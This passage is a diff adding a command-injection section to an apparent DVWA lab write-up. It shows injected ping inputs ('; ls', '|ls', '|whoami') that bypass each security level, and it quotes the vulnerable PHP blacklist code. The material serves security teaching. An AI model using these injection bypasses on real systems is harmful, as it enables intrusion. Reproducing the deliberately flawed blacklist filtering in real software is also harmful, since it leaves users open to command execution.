@@ -64,6 +64,129 @@ service mariadb start</code></pre>
 
         <p>To further visualize the result, I also used the "show response in browser" option, which proved that the attack worked as intended: "Welcome to the password protected area admin"</p>
 
+                <h2>Command Injection</h2>
+
+        <p>As the prompt says, I pinged my local Kali VM IP and everything worked as intended</p>
+
+        <pre><code>PING 10.0.2.15 (10.0.2.15) 56(84) bytes of data.
+64 bytes from 10.0.2.15: icmp_seq=1 ttl=64 time=0.018 ms
+64 bytes from 10.0.2.15: icmp_seq=2 ttl=64 time=0.022 ms
+64 bytes from 10.0.2.15: icmp_seq=3 ttl=64 time=0.022 ms
+64 bytes from 10.0.2.15: icmp_seq=4 ttl=64 time=0.024 ms
+
+--- 10.0.2.15 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3083ms
+rtt min/avg/max/mdev = 0.018/0.021/0.024/0.002 ms</code></pre>
+
+        <p>simple commands like whoami, ls -la etc. did not return anything, so I used Burp to try to understand what the request looks like</p>
+
+        <pre><code>ip=10.0.2.15&Submit=Submit</code></pre>
+
+        <p>nothing caught my eye here, but while looking at the Command Injection documentation from Owasp, I saw something interesting</p>
+
+        <pre><code>Used normally, the output is simply the contents of the file requested:
+
+$ ./catWrapper Story.txt
+When last we left our heroes...
+
+However, if we add a semicolon and another command to the end of this line, the command is executed by catWrapper with no complaint:
+
+$ ./catWrapper "Story.txt; ls"
+When last we left our heroes...
+Story.txt               doubFree.c              nullpointer.c</code></pre>
+
+        <p>I applied this to my scenario, and it did in fact work:</p>
+
+        <pre><code>Enter an IP address:
+10.0.2.15; ls
+
+
+PING 10.0.2.15 (10.0.2.15) 56(84) bytes of data.
+64 bytes from 10.0.2.15: icmp_seq=1 ttl=64 time=0.018 ms
+64 bytes from 10.0.2.15: icmp_seq=2 ttl=64 time=0.031 ms
+64 bytes from 10.0.2.15: icmp_seq=3 ttl=64 time=0.020 ms
+64 bytes from 10.0.2.15: icmp_seq=4 ttl=64 time=0.021 ms
+
+--- 10.0.2.15 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3080ms
+rtt min/avg/max/mdev = 0.018/0.022/0.031/0.005 ms
+
+help
+index.php
+source</code></pre>
+
+        <p>However, this only works for the Low level setting</p>
+
+        <p>In the medium level, these commands are not allowed anymore:</p>
+
+        <pre><code>// Set blacklist
+$substitutions = array(
+    '&&' => '',
+    ';'  => '',
+);</code></pre>
+
+        <p>However, this does not do much as I can still use "|" (Example 6 from the OWASP Command Injection documentation)</p>
+
+        <pre><code>Enter an IP address:
+10.0.2.15|ls
+
+
+help
+index.php
+source</code></pre>
+
+        <p>For the High level, input sanitization is done with more care:</p>
+
+        <pre><code>$target = trim($_REQUEST['ip']);
+
+// Set blacklist
+$substitutions = array(
+    '||' => '',
+    '&'  => '',
+    ';'  => '',
+    '| ' => '',
+    '-'  => '',
+    '$'  => '',
+    '('  => '',
+    ')'  => '',
+    '`'  => '',
+);</code></pre>
+
+        <p>as well as</p>
+
+        <pre><code>// Remove any of the characters in the array (blacklist).
+$target = str_replace(
+    array_keys($substitutions),
+    $substitutions,
+    $target
+);</code></pre>
+
+        <p>However, on the first try, the command still seems to work?</p>
+
+        <pre><code>Enter an IP address:
+10.0.2.15|whoami
+
+www-data</code></pre>
+
+        <p>but why does it work?</p>
+
+        <p>Seems like all the other options will not work (10.0.2.15;whoami, 10.0.2.15&whoami etc.)</p>
+
+        <p>After looking at the blacklist, I noticed what seems to be the error:</p>
+
+        <pre><code>'| ' => ''</code></pre>
+
+        <p>there is a space after the "|" character</p>
+
+        <p>the trim() method does not seem to be enough to fix this issue</p>
+
+        <p>After looking up trim(), I found out that it only removed whitespaces from the beginning and end of the string</p>
+
+        <p>As for the line that actually deals with the "|" character, <code>'| ' => ''</code>, this only transforms the | character into whitespace IF the | is followed by a space</p>
+
+        <p>In that scenario, the attack would not work:</p>
+
+        <pre><code>10.0.2.15| whoami</code></pre>
     </div>
 </section>
 
